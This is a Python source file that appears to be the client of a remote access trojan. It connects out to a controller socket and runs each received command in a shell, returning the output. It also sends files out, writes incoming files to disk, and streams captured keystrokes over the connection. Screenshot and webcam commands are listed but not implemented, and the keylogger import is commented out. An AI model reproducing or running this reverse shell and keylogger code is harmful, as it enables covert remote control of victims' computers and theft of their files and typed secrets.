import socket
import os
import subprocess
#import pynput
#from pynput.keyboard import Key, Listener
BUFFER = 1024

host = socket.gethostbyname(socket.gethostname())
port = 5050
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

fn = ['upload', 'download', 'keylog', 'screenshot', 'webcam']
def upload():
    filename = s.recv(BUFFER)
    f = open(filename, 'rb')
    i = f.read(BUFFER)

    while i:
        s.send(i)
        i = f.read(BUFFER)

    f.close()
    s.send(b'Complete')


def download():
    # etre dans bon repertoire

    f = open(os.getcwd() + "\\" + data[7:].decode('utf-8'), 'wb')
    i = s.recv(BUFFER)

    while not ('Complete' in str(i)):
        f.write(i)
        # print(str(i))
        i = s.recv(BUFFER)

    f.close()

count = 0
def on_press(key):
    global count

    k = str(key).replace("'", "")
    s.send(str.encode(k))
    count += 1
    #print(k)

def on_release(key):
    global count

    if count == 10:
        s.send(str.encode("end"))
        count = 0
        return False


def keylogger():

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


while True:
    data = s.recv(BUFFER)  # receive data in bytes, 1024 = buffer size
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))  # change directory
    if data.decode("utf-8") == 'keylog':
        keylogger()
        data = s.recv(1024)

    if data.decode("utf-8") == 'download':
        upload()
        data = s.recv(BUFFER)

    if data[:6].decode("utf-8") == 'upload':
        download()

    if data.decode("utf-8") == 'quit':
        break

    if len(data) > 0:
        # create a cmd window which execute our command, shell, standard output, input, error stream
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True,
                               stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)

        for i in fn:

            if data.decode('utf-8') == i:
                output_byte = cmd.stdout.read()
            else:
                output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, 'utf-8')  # convert into str
        currentWD = os.getcwd() + ">"  # display current directory
        s.send(str.encode(output_str + currentWD))




